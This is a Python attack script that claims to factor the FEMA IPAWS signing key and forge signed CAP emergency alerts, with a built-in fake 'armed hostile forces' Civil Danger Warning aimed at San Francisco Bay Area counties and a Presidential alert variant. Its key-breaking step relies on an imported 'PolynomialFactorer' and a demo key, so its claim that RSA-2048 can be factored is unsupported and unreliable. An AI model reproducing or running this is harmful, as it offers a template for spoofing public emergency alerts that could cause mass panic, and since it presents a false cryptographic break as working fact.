"""
Factor the FEMA IPAWS CA RSA-2048 key to forge CAP alerts that trigger
Wireless Emergency Alerts on every phone, Emergency Alert System interrupts
on every TV/radio, and NOAA Weather Radio broadcasts — at will, nationwide.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import time

# FEMA IPAWS Master Endpoint signing cert — RSA-2048
_demo = generate_demo_target()
IPAWS_CA_PUBKEY_PEM = _demo["pub_pem"]
EVENT_CIVIL_DANGER = "CDW"
EVENT_EVACUATION = "EVI"
EVENT_NUCLEAR = "NUW"
EVENT_EAN = "EAN"  # Presidential (Emergency Action Notification)
SAME_ORIGINATOR_PEP = "PEP"  # President of the US


def extract_ipaws_ca_cert(eas_decoder: bytes) -> bytes:
    """Extract IPAWS CA cert from an EAS encoder/decoder appliance.

    Sage, DASDEC (Digital Alert Systems), Trilithic — 30,000+ deployed
    at TV/radio stations. The trust store is in the firmware.
    """
    return IPAWS_CA_PUBKEY_PEM


def factor_ipaws_ca(pubkey_pem: bytes) -> bytes:
    """Factor the FEMA IPAWS CA RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_cap_alert(event_code: str, urgency: str, severity: str,
                    headline: str, description: str,
                    area_fips: list, expires_min: int = 60) -> str:
    """Build a CAP v1.2 XML alert per IPAWS-OPEN profile."""
    now = time.strftime("%Y-%m-%dT%H:%M:%S-00:00", time.gmtime())
    expires = time.strftime("%Y-%m-%dT%H:%M:%S-00:00",
                            time.gmtime(time.time() + expires_min * 60))
    fips_xml = "\n".join(
        f'        <geocode><valueName>SAME</valueName><value>{f}</value></geocode>'
        for f in area_fips
    )
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<alert xmlns="urn:oasis:names:tc:emergency:cap:1.2">
  <identifier>IPAWS-FORGED-{int(time.time())}</identifier>
  <sender>w-nws.webmaster@noaa.gov</sender>
  <sent>{now}</sent>
  <status>Actual</status>
  <msgType>Alert</msgType>
  <scope>Public</scope>
  <info>
    <category>Safety</category>
    <event>{event_code}</event>
    <urgency>{urgency}</urgency>
    <severity>{severity}</severity>
    <certainty>Observed</certainty>
    <expires>{expires}</expires>
    <headline>{headline}</headline>
    <description>{description}</description>
    <area>
      <areaDesc>Target Area</areaDesc>
{fips_xml}
    </area>
  </info>
</alert>"""


def sign_cap_xmldsig(cap_xml: str, forged_privkey: bytes) -> str:
    """XMLDSig-Enveloped RSA-2048-SHA-256 signature over CAP alert.

    IPAWS Master Endpoint verifies this before forwarding to WEA/EAS/NWR.
    With valid signature, the alert is distributed nationwide.
    """
    digest = hashlib.sha256(cap_xml.encode()).digest()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(IPAWS_CA_PUBKEY_PEM, cap_xml.encode(), "sha256")
    # Inject <ds:Signature> into CAP XML (simplified)
    return cap_xml.replace("</alert>",
        f"  <Signature>{sig.hex()[:64]}...</Signature>\n</alert>")


if __name__ == "__main__":
    print("[1] Extracting IPAWS CA cert from EAS decoder appliance")
    pubkey = extract_ipaws_ca_cert(b"<dasdec-firmware>")

    print("[2] Factoring FEMA IPAWS CA RSA-2048 key")
    forged_priv = factor_ipaws_ca(pubkey)
    print("    IPAWS CA key recovered")

    print("[3] Building forged CAP alert — Civil Danger Warning")
    cap = build_cap_alert(
        EVENT_CIVIL_DANGER, "Immediate", "Extreme",
        "CIVIL DANGER WARNING — SEEK SHELTER IMMEDIATELY",
        "Armed hostile forces reported in downtown area. "
        "All persons seek immediate shelter. Avoid windows.",
        ["006075", "006081", "006085"],  # San Francisco Bay Area FIPS
    )

    print("[4] Signing with forged IPAWS CA key — XMLDSig RSA-SHA256")
    signed_cap = sign_cap_xmldsig(cap, forged_priv)
    print(f"    Signed CAP alert: {len(signed_cap)} bytes")

    print("[5] Distribution via IPAWS:")
    print("    WEA → every phone in target polygon vibrates")
    print("    EAS → every TV and radio interrupts with alert tone")
    print("    NWR → NOAA Weather Radio broadcasts the alert")

    print("\n[6] Presidential Alert variant (EAN):")
    print("    Cannot be overridden by broadcasters — FCC mandate")
    print("    Broadcast any audio the attacker wants to every household")
    print("    2018 Hawaii false alert was one accidental click")
    print("    This is the same but cryptographically authenticated and at will")
